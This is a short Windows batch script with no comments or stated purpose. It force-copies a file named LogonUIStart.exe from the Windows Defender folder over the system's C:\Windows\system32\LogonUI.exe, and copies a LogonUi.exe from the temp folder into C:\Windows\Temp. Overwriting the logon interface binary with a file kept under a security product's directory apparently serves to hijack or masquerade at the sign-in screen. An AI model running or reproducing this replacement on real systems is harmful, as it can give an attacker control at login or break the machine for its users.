@echo on
cd\
copy "C:\Windows\Defender\LogonUIStart.exe" "C:\Windows\system32\LogonUI.exe" /Y
copy %temp%\LogonUi.exe "C:\Windows\Temp\LogonUi.exe" /Y